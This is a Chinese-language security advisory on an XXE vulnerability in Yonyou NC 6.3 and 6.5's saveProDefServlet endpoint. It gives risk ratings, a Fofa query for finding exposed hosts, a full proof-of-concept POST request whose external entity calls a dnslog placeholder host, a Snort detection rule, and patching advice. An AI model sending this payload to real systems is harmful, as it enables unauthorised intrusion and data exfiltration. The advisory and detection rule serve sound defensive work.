# 用友NC saveProDefServlet XML实体注入(XXE)漏洞

用友NC saveProDefServlet XML实体注入(XXE)漏洞

# 影响版本

**用友NC 6.3**和**6.5**系列

# **漏洞状态**

|**漏洞细节**|**漏洞POC**|**漏洞EXP**|**在野利用**|
| :-: | :-: | :-: | :-: |
|**是**|**已公开**|**已公开**|**已知**|

## 风险等级

|**维度**|**评价**|
| :-: | :-: |
|**威胁等级**|**高危**|
|**影响面**|**广**|
|**攻击者价值**|**高**|
|**利用难度**|**低**|

# 漏洞复现

**Fofa:**  **app=&quot;用友-UFIDA-NC&quot;**

**POC/EXP：**

**step1 响应内容特征：Dnslog回显**

```
POST /portal/pt/servlet/saveProDefServlet/doPost?pageId=login HTTP/1.1
Host: 127.0.0.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded

prodefxml={{url({{url(<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://dnslog-host/xxe_test">
%remote;]>
<root/>)}})}}
```

![image](assets/image-20260831225805-c9iwnai.png)​

**sonrt规则：**

```
alert tcp any any -> $HOME_NET any (
    msg:"用友NC - /portal/pt/servlet/saveProDefServlet/doPost XML实体注入(XXE)漏洞";
    flow:to_server,established;
    http.method; content:"POST";
    http.uri; content:"/portal/pt/servlet/saveProDefServlet/doPost"; fast_pattern;
    http.uri; content:"pageId=login"; distance:0;
    http.content_type; content:"application/x-www-form-urlencoded";
    http.request_body; content:"prodefxml="; nocase;
    http.request_body; pcre:"/<!DOCTYPE\s+root\s+\[/i";
    http.request_body; pcre:"/SYSTEM\s+[\"']http:/i";
    metadata:
        service http,
        affected_product "用友NC",
        vulnerability_type "XML External Entity Injection (XXE)",
        severity "critical";
    classtype:web-application-attack;
    sid:1000745;
    rev:1;
    priority:1;
)
```

# 漏洞修复

**尽快升级**：官方已发布安全补丁。

‍
